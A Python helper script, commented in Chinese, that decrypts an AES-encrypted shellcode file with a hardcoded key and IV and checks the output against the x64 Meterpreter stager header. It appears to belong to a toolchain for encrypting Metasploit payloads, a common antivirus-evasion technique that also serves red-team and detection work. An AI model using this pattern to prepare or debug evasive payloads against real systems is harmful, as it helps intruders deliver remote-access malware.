#!/usr/bin/env python3
"""
验证 AES 解密是否正确
"""

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# 读取加密的 shellcode
with open('payload_x64_aes.bin', 'rb') as f:
    encrypted = f.read()

print(f"[+] Encrypted shellcode size: {len(encrypted)} bytes")

# 使用相同的密钥和 IV
key = bytes([0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
             0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C])
iv = bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
            0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F])

print(f"[+] Key: {key.hex()}")
print(f"[+] IV:  {iv.hex()}")

# 解密
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)

print(f"[+] Decrypted size: {len(decrypted)} bytes")
print(f"[+] First 16 bytes: {decrypted[:16].hex()}")
print(f"[+] Expected:       fc4883e4f0e8c8000000415141505251")

# 验证
expected = bytes.fromhex("fc4883e4f0e8c8000000415141505251")
if decrypted[:16] == expected:
    print("[✓] Decryption CORRECT! Shellcode matches expected Meterpreter header")
else:
    print("[✗] Decryption FAILED! Shellcode does not match")
    print(f"    Got:      {decrypted[:16].hex()}")
    print(f"    Expected: {expected.hex()}")

# 保存解密后的 shellcode
with open('payload_x64_decrypted.bin', 'wb') as f:
    f.write(decrypted)

print(f"[+] Decrypted shellcode saved to: payload_x64_decrypted.bin")

# 显示更多字节用于调试
print(f"\n[+] First 64 bytes of decrypted shellcode:")
for i in range(0, min(64, len(decrypted)), 16):
    hex_str = ' '.join([f'{b:02X}' for b in decrypted[i:i+16]])
    print(f"    {i:04X}: {hex_str}")
